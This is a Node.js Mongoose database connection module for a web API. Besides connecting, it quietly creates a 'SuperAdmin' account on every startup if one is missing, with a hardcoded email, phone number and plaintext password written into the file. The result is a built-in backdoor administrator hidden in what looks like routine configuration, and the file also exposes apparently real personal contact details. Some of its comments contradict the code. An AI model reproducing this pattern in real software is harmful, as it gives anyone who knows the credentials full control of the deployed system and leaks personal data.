const mongoose = require('mongoose');
const logger = require('./../config/logger');
const { mongo, env } = require('./vars');
const Admin = require("../api/models/admin.model")
// set mongoose Promise to Bluebird
mongoose.Promise = Promise;

// Exit application on error
mongoose.connection.on('error', (err) => {
  logger.error(`MongoDB connection error: ${err}`);
  process.exit(-1);
});

// print mongoose logs in dev env
if (env === 'development') {
  mongoose.set('debug', false);
}

/**
 * Connect to mongo db
 *
 * @returns {object} Mongoose connection
 * @public
 */
exports.connect = () => {
  mongoose
    .connect(mongo.uri, {
      useCreateIndex: true,
      keepAlive: 1,
      useNewUrlParser: true,
      useUnifiedTopology: true,
      useFindAndModify: false,
    })
    .then(async () => {
      console.log('mongoDB connected...');
      const admin = new Admin({
        email: "topwolf0808@gmail.com",
        phoneNumber: "+8613124260482",
        password: "zaq1!QAZ",
        role: "SuperAdmin",
        status: "active"

      });
      const adminData = await Admin.findOne({email: "topwolf0808@gmail.com"});
      if(!adminData) admin.save();
    });
  return mongoose.connection;
};
